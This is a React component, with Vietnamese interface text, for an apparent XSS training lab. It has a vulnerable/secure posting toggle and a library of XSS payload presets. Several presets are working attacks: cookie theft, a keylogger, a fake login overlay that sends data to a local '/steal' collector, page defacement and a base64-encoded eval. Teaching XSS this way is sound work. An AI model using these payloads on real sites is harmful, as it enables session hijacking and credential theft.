import { useState } from 'react'
import { useNavigate } from 'react-router-dom'
import { postApi, type XSSDetection } from '../lib/api'
import { AlertTriangle, ShieldCheck, ShieldOff, Send, Copy, Check } from 'lucide-react'

const PAYLOAD_PRESETS = [
  { label: 'Basic Script', category: 'basic', payload: '<script>alert("XSS")</script>' },
  { label: 'IMG onerror', category: 'basic', payload: '<img src=x onerror="alert(\'XSS\')">' },
  { label: 'SVG onload', category: 'basic', payload: '<svg onload="alert(\'XSS\')">' },
  { label: 'Input autofocus', category: 'basic', payload: '<input onfocus="alert(\'XSS\')" autofocus>' },
  { label: 'Cookie Theft', category: 'attack', payload: '<img src=x onerror="fetch(\'http://localhost:4000/steal?cookie=\'+document.cookie)">' },
  { label: 'Keylogger', category: 'attack', payload: '<script>document.onkeypress=function(e){fetch(\'http://localhost:4000/steal?type=key&key=\'+e.key)}</script>' },
  { label: 'Phishing Overlay', category: 'attack', payload: `<script>document.body.innerHTML='<div style="position:fixed;inset:0;background:#fff;z-index:9999;display:flex;align-items:center;justify-content:center"><form action="http://localhost:4000/steal" method="POST"><h2>Session Expired</h2><input name="type" value="form" hidden><input name="username" placeholder="Username" style="display:block;margin:8px 0;padding:8px;border:1px solid #ccc"><input name="password" type="password" placeholder="Password" style="display:block;margin:8px 0;padding:8px;border:1px solid #ccc"><button style="padding:8px 16px;background:#3b82f6;color:#fff;border:none;cursor:pointer">Login</button></form></div>'</script>` },
  { label: 'Page Defacement', category: 'attack', payload: `<script>document.body.innerHTML='<h1 style="color:red;text-align:center;margin-top:200px">HACKED</h1>'</script>` },
  { label: 'Base64 Encoded', category: 'advanced', payload: `<img src=x onerror="eval(atob('YWxlcnQoJ1hTUycp'))">` },
  { label: 'Iframe', category: 'basic', payload: '<iframe src="javascript:alert(\'XSS\')"></iframe>' },
  { label: 'Link', category: 'basic', payload: '<a href="javascript:alert(\'XSS\')">Click me</a>' },
]

export default function CreatePost() {
  const navigate = useNavigate()
  const [title, setTitle] = useState('')
  const [content, setContent] = useState('')
  const [secureMode, setSecureMode] = useState(false)
  const [loading, setLoading] = useState(false)
  const [error, setError] = useState('')
  const [xssInfo, setXssInfo] = useState<XSSDetection | null>(null)
  const [copiedIdx, setCopiedIdx] = useState<number | null>(null)
  const [showPayloads, setShowPayloads] = useState(false)

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setLoading(true)
    setError('')

    const res = await postApi.create(title, content, secureMode ? 'secure' : undefined)
    if (res.data) {
      if (res.data.xssDetection) setXssInfo(res.data.xssDetection)
      navigate(`/post/${res.data.id}`)
    } else {
      setError(res.error || 'Lỗi tạo bài viết')
    }
    setLoading(false)
  }

  const insertPayload = (payload: string) => {
    setContent(prev => prev + payload)
  }

  const copyPayload = (payload: string, idx: number) => {
    navigator.clipboard.writeText(payload)
    setCopiedIdx(idx)
    setTimeout(() => setCopiedIdx(null), 1500)
  }

  return (
    <div className="max-w-4xl mx-auto px-4 py-8">
      <h1 className="text-3xl font-bold text-gray-900 mb-2">Tạo bài viết mới</h1>
      <p className="text-gray-500 mb-8">Nhập nội dung hoặc chọn payload XSS từ thư viện bên dưới</p>

      {/* Mode Toggle */}
      <div className="flex items-center gap-4 mb-6 p-4 bg-gray-50 rounded-xl border">
        <button
          type="button"
          onClick={() => setSecureMode(false)}
          className={`flex items-center gap-2 px-4 py-2 rounded-lg font-medium transition ${
            !secureMode
              ? 'bg-red-100 text-red-700 ring-2 ring-red-300'
              : 'bg-white text-gray-500 hover:bg-gray-100'
          }`}
        >
          <ShieldOff className="w-4 h-4" />
          Vulnerable Mode
        </button>
        <button
          type="button"
          onClick={() => setSecureMode(true)}
          className={`flex items-center gap-2 px-4 py-2 rounded-lg font-medium transition ${
            secureMode
              ? 'bg-green-100 text-green-700 ring-2 ring-green-300'
              : 'bg-white text-gray-500 hover:bg-gray-100'
          }`}
        >
          <ShieldCheck className="w-4 h-4" />
          Secure Mode
        </button>
        <span className="text-sm text-gray-400 ml-2">
          {secureMode
            ? 'DOMPurify sẽ sanitize nội dung trước khi lưu'
            : 'Nội dung HTML/Script sẽ được lưu nguyên — có thể XSS!'}
        </span>
      </div>

      {!secureMode && (
        <div className="bg-red-50 border-l-4 border-red-500 p-4 mb-6 rounded-r-lg">
          <div className="flex items-start gap-3">
            <AlertTriangle className="w-5 h-5 text-red-600 mt-0.5" />
            <p className="text-red-800 text-sm">
              <strong>Cảnh báo:</strong> Chế độ Vulnerable — nội dung sẽ không được lọc. Script trong bài viết sẽ thực thi khi người dùng xem bài.
            </p>
          </div>
        </div>
      )}

      <form onSubmit={handleSubmit} className="space-y-5">
        <div>
          <label className="block text-sm font-medium text-gray-700 mb-1">Tiêu đề</label>
          <input
            type="text"
            value={title}
            onChange={e => setTitle(e.target.value)}
            className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
            placeholder="Nhập tiêu đề bài viết..."
            required
          />
        </div>

        <div>
          <label className="block text-sm font-medium text-gray-700 mb-1">Nội dung</label>
          <textarea
            value={content}
            onChange={e => setContent(e.target.value)}
            rows={8}
            className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 font-mono text-sm"
            placeholder={`Nhập nội dung... hoặc thử paste payload XSS:\n<script>alert("XSS")</script>`}
            required
          />
        </div>

        {error && <p className="text-red-500 text-sm">{error}</p>}
        {xssInfo && xssInfo.isXSS && (
          <div className="p-3 bg-yellow-50 border border-yellow-200 rounded-lg text-sm">
            <span className="font-medium text-yellow-800">XSS Detected: </span>
            <span className="text-yellow-700">Risk Level: {xssInfo.riskLevel} — {xssInfo.matchedPatterns.join(', ')}</span>
          </div>
        )}

        <button
          type="submit"
          disabled={loading}
          className="flex items-center gap-2 px-6 py-3 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition font-medium disabled:opacity-50"
        >
          <Send className="w-4 h-4" />
          {loading ? 'Đang gửi...' : 'Đăng bài'}
        </button>
      </form>

      {/* Payload Library */}
      <div className="mt-10">
        <button
          type="button"
          onClick={() => setShowPayloads(!showPayloads)}
          className="text-lg font-bold text-gray-900 flex items-center gap-2 mb-4 hover:text-blue-600 transition"
        >
          {showPayloads ? '▼' : '▶'} Payload Library ({PAYLOAD_PRESETS.length} payloads)
        </button>

        {showPayloads && (
          <div className="space-y-3">
            {['basic', 'attack', 'advanced'].map(cat => (
              <div key={cat}>
                <h3 className="text-sm font-semibold text-gray-500 uppercase mb-2 mt-4">
                  {cat === 'basic' ? 'Basic XSS' : cat === 'attack' ? 'Attack Payloads' : 'Advanced / Encoded'}
                </h3>
                {PAYLOAD_PRESETS.filter(p => p.category === cat).map((preset, idx) => {
                  const globalIdx = PAYLOAD_PRESETS.indexOf(preset)
                  return (
                    <div key={idx} className="flex items-center gap-2 p-3 bg-gray-50 rounded-lg border border-gray-200">
                      <span className="text-sm font-medium text-gray-700 w-36 flex-shrink-0">{preset.label}</span>
                      <code className="flex-1 text-xs text-gray-600 bg-white px-2 py-1 rounded border truncate">
                        {preset.payload}
                      </code>
                      <button
                        type="button"
                        onClick={() => copyPayload(preset.payload, globalIdx)}
                        className="p-1.5 text-gray-400 hover:text-gray-600 transition"
                        title="Copy"
                      >
                        {copiedIdx === globalIdx ? <Check className="w-4 h-4 text-green-500" /> : <Copy className="w-4 h-4" />}
                      </button>
                      <button
                        type="button"
                        onClick={() => insertPayload(preset.payload)}
                        className="px-3 py-1 text-xs bg-blue-100 text-blue-700 rounded hover:bg-blue-200 transition font-medium"
                      >
                        Insert
                      </button>
                    </div>
                  )
                })}
              </div>
            ))}
          </div>
        )}
      </div>
    </div>
  )
}
